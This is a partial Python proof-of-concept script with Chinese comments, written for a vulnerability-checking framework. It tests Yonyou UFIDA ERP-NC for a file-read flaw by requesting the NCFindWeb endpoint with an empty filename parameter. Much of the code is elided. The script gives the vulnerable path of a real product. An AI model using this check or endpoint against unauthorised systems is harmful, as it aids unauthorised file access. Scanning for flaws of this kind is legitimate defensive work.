...
POC_NAME = "test"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同
...
class test(BasePoc):
    ...
    poc_info = {
        'poc': {
            'Id': 'vb_2021_0025',    # PoC的VID编号
            'vbid': '',
            'Name': 'yonyou-UFIDA-NC',    # PoC名称
            'Author': 'fishr',    # PoC作者
            'Create_date': '2021-7-19',    # PoC创建时间
            },

        'vul': {
            'Product': 'yonyou',    # 漏洞所在产品名称
            'Version': 'ERP-NC',    # 产品的版本号
            'Type': 'ReadFile',    # 漏洞类型
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/NCFindWeb?service=IPreAlertConfigService&filename=')
        headers = {
        ...
        if "login.jsp" in location:
            ...
            if verbose:
                highlight('[*] test ERP-NC File reading Found')    # 打印高亮信息发现漏洞，其他可用方法
        else:
            if verbose:
                highlight('[*] test ERP-NC File reading Not Found')
